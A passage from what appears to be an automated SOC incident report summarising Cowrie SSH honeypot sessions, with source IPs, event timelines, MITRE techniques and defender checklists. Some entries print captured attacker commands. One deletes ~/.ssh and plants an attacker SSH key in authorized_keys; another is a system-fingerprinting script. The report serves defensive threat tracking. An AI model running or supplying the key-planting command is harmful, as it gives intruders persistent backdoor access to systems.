| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 10:41:57` | `cowrie.session.connect` |
| `2026-09-06 10:41:57` | `cowrie.client.version` |
| `2026-09-06 10:41:57` | `cowrie.client.kex` |
| `2026-09-06 10:41:58` | `cowrie.login.success` |
| `2026-09-06 10:42:00` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:42:01` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 10:42:01` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:42:02` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:42:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 10:42:02` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:42:03` | `cowrie.direct-tcpip.request` |
| `2026-09-06 10:42:04` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 10:42:04` | `cowrie.direct-tcpip.data` |
| `2026-09-06 10:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d51cea168ffa

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-06 11:01 |
| **Last Seen** | 2026-09-06 11:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 11:01:21` | `cowrie.session.connect` |
| `2026-09-06 11:01:21` | `cowrie.client.version` |
| `2026-09-06 11:01:21` | `cowrie.client.kex` |
| `2026-09-06 11:01:22` | `cowrie.login.success` |
| `2026-09-06 11:01:22` | `cowrie.direct-tcpip.request` |
| `2026-09-06 11:01:22` | `cowrie.direct-tcpip.data` |
| `2026-09-06 11:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc818011042e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.235[.]9` |
| **First Seen** | 2026-09-06 11:52 |
| **Last Seen** | 2026-09-06 11:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 11:52:02` | `cowrie.session.connect` |
| `2026-09-06 11:52:02` | `cowrie.client.version` |
| `2026-09-06 11:52:02` | `cowrie.client.kex` |
| `2026-09-06 11:52:02` | `cowrie.login.success` |
| `2026-09-06 11:52:03` | `cowrie.session.params` |
| `2026-09-06 11:52:03` | `cowrie.command.input` |
| `2026-09-06 11:52:03` | `cowrie.command.failed` |
| `2026-09-06 11:52:03` | `cowrie.log.closed` |
| `2026-09-06 11:52:04` | `cowrie.session.params` |
| `2026-09-06 11:52:04` | `cowrie.command.input` |
| `2026-09-06 11:52:04` | `cowrie.session.file_download` |
| `2026-09-06 11:52:04` | `cowrie.log.closed` |
| `2026-09-06 11:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.235[.]9` to AbuseIPDB if not already reported
- [ ] Block `165.154.235[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27499287e5dd

| Field | Detail |
|---|---|
| **Source IP** | `165.154.235[.]9` |
| **First Seen** | 2026-09-06 11:52 |
| **Last Seen** | 2026-09-06 11:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 11:52:04` | `cowrie.session.connect` |
| `2026-09-06 11:52:04` | `cowrie.client.version` |
| `2026-09-06 11:52:04` | `cowrie.client.kex` |
| `2026-09-06 11:52:04` | `cowrie.login.success` |
| `2026-09-06 11:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.235[.]9` to AbuseIPDB if not already reported
- [ ] Block `165.154.235[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4078fa6f59c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.235[.]9` |
| **First Seen** | 2026-09-06 11:52 |
| **Last Seen** | 2026-09-06 11:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 11:52:05` | `cowrie.session.connect` |
| `2026-09-06 11:52:05` | `cowrie.client.version` |
| `2026-09-06 11:52:05` | `cowrie.client.kex` |
| `2026-09-06 11:52:05` | `cowrie.login.success` |
| `2026-09-06 11:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.235[.]9` to AbuseIPDB if not already reported
- [ ] Block `165.154.235[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bda303be1f3

| Field | Detail |
|---|---|
| **Source IP** | `103.239.252[.]132` |
| **First Seen** | 2026-09-06 11:56 |
| **Last Seen** | 2026-09-06 11:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 11:56:04` | `cowrie.session.connect` |
| `2026-09-06 11:56:04` | `cowrie.client.version` |
| `2026-09-06 11:56:05` | `cowrie.client.kex` |
| `2026-09-06 11:56:06` | `cowrie.login.success` |
| `2026-09-06 11:56:07` | `cowrie.session.params` |
| `2026-09-06 11:56:07` | `cowrie.command.input` |
| `2026-09-06 11:56:07` | `cowrie.command.failed` |
| `2026-09-06 11:56:07` | `cowrie.log.closed` |
| `2026-09-06 11:56:08` | `cowrie.session.params` |
| `2026-09-06 11:56:08` | `cowrie.command.input` |
| `2026-09-06 11:56:09` | `cowrie.session.file_download` |
| `2026-09-06 11:56:09` | `cowrie.log.closed` |
| `2026-09-06 11:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.239.252[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.239.252[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33cd91dcb12b

| Field | Detail |
|---|---|
| **Source IP** | `103.239.252[.]132` |
| **First Seen** | 2026-09-06 11:56 |
| **Last Seen** | 2026-09-06 11:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 11:56:09` | `cowrie.session.connect` |
| `2026-09-06 11:56:09` | `cowrie.client.version` |
| `2026-09-06 11:56:09` | `cowrie.client.kex` |
| `2026-09-06 11:56:10` | `cowrie.login.success` |
| `2026-09-06 11:56:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.239.252[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.239.252[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9803b3f8fddf

| Field | Detail |
|---|---|
| **Source IP** | `103.239.252[.]132` |
| **First Seen** | 2026-09-06 11:56 |
| **Last Seen** | 2026-09-06 11:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 11:56:11` | `cowrie.session.connect` |
| `2026-09-06 11:56:11` | `cowrie.client.version` |
| `2026-09-06 11:56:11` | `cowrie.client.kex` |
| `2026-09-06 11:56:12` | `cowrie.login.success` |
| `2026-09-06 11:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.239.252[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.239.252[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dbe8901d976

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:08 |
| **Last Seen** | 2026-09-06 12:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:08:04` | `cowrie.session.connect` |
| `2026-09-06 12:08:04` | `cowrie.client.version` |
| `2026-09-06 12:08:04` | `cowrie.client.kex` |
| `2026-09-06 12:08:05` | `cowrie.login.success` |
| `2026-09-06 12:08:06` | `cowrie.session.params` |
| `2026-09-06 12:08:06` | `cowrie.command.input` |
| `2026-09-06 12:08:06` | `cowrie.log.closed` |
| `2026-09-06 12:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d86031fc0520

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:11 |
| **Last Seen** | 2026-09-06 12:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:11:10` | `cowrie.session.connect` |
| `2026-09-06 12:11:10` | `cowrie.client.version` |
| `2026-09-06 12:11:10` | `cowrie.client.kex` |
| `2026-09-06 12:11:11` | `cowrie.login.success` |
| `2026-09-06 12:11:12` | `cowrie.session.params` |
| `2026-09-06 12:11:12` | `cowrie.command.input` |
| `2026-09-06 12:11:13` | `cowrie.log.closed` |
| `2026-09-06 12:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e3b70654b6d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:14 |
| **Last Seen** | 2026-09-06 12:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:14:01` | `cowrie.session.connect` |
| `2026-09-06 12:14:01` | `cowrie.client.version` |
| `2026-09-06 12:14:01` | `cowrie.client.kex` |
| `2026-09-06 12:14:02` | `cowrie.login.success` |
| `2026-09-06 12:14:04` | `cowrie.session.params` |
| `2026-09-06 12:14:04` | `cowrie.command.input` |
| `2026-09-06 12:14:04` | `cowrie.log.closed` |
| `2026-09-06 12:14:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ee57b5bbcbf

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:16 |
| **Last Seen** | 2026-09-06 12:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:16:41` | `cowrie.session.connect` |
| `2026-09-06 12:16:41` | `cowrie.client.version` |
| `2026-09-06 12:16:41` | `cowrie.client.kex` |
| `2026-09-06 12:16:42` | `cowrie.login.success` |
| `2026-09-06 12:16:44` | `cowrie.session.params` |
| `2026-09-06 12:16:44` | `cowrie.command.input` |
| `2026-09-06 12:16:44` | `cowrie.log.closed` |
| `2026-09-06 12:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c96a91c9e94c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-06 12:18 |
| **Last Seen** | 2026-09-06 12:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:18:16` | `cowrie.session.connect` |
| `2026-09-06 12:18:16` | `cowrie.client.version` |
| `2026-09-06 12:18:16` | `cowrie.client.kex` |
| `2026-09-06 12:18:17` | `cowrie.login.success` |
| `2026-09-06 12:18:17` | `cowrie.direct-tcpip.request` |
| `2026-09-06 12:18:17` | `cowrie.direct-tcpip.data` |
| `2026-09-06 12:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-427bee02c0c3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:19 |
| **Last Seen** | 2026-09-06 12:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:19:12` | `cowrie.session.connect` |
| `2026-09-06 12:19:12` | `cowrie.client.version` |
| `2026-09-06 12:19:12` | `cowrie.client.kex` |
| `2026-09-06 12:19:13` | `cowrie.login.success` |
| `2026-09-06 12:19:14` | `cowrie.session.params` |
| `2026-09-06 12:19:14` | `cowrie.command.input` |
| `2026-09-06 12:19:15` | `cowrie.log.closed` |
| `2026-09-06 12:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32168d47c079

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:24 |
| **Last Seen** | 2026-09-06 12:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:24:11` | `cowrie.session.connect` |
| `2026-09-06 12:24:11` | `cowrie.client.version` |
| `2026-09-06 12:24:11` | `cowrie.client.kex` |
| `2026-09-06 12:24:15` | `cowrie.login.success` |
| `2026-09-06 12:24:18` | `cowrie.session.params` |
| `2026-09-06 12:24:18` | `cowrie.command.input` |
| `2026-09-06 12:24:19` | `cowrie.log.closed` |
| `2026-09-06 12:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de2ec78b6ec5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:26 |
| **Last Seen** | 2026-09-06 12:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:26:27` | `cowrie.session.connect` |
| `2026-09-06 12:26:27` | `cowrie.client.version` |
| `2026-09-06 12:26:27` | `cowrie.client.kex` |
| `2026-09-06 12:26:29` | `cowrie.login.success` |
| `2026-09-06 12:26:31` | `cowrie.session.params` |
| `2026-09-06 12:26:31` | `cowrie.command.input` |
| `2026-09-06 12:26:31` | `cowrie.log.closed` |
| `2026-09-06 12:26:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1168d1c705b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:28 |
| **Last Seen** | 2026-09-06 12:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:28:43` | `cowrie.session.connect` |
| `2026-09-06 12:28:43` | `cowrie.client.version` |
| `2026-09-06 12:28:43` | `cowrie.client.kex` |
| `2026-09-06 12:28:44` | `cowrie.login.success` |
| `2026-09-06 12:28:46` | `cowrie.session.params` |
| `2026-09-06 12:28:46` | `cowrie.command.input` |
| `2026-09-06 12:28:47` | `cowrie.log.closed` |
| `2026-09-06 12:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5156578d0fa5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:31 |
| **Last Seen** | 2026-09-06 12:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:31:11` | `cowrie.session.connect` |
| `2026-09-06 12:31:11` | `cowrie.client.version` |
| `2026-09-06 12:31:11` | `cowrie.client.kex` |
| `2026-09-06 12:31:13` | `cowrie.login.success` |
| `2026-09-06 12:31:14` | `cowrie.session.params` |
| `2026-09-06 12:31:14` | `cowrie.command.input` |
| `2026-09-06 12:31:14` | `cowrie.log.closed` |
| `2026-09-06 12:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a43693dfda55

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 12:33 |
| **Last Seen** | 2026-09-06 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 12:33:41` | `cowrie.session.connect` |
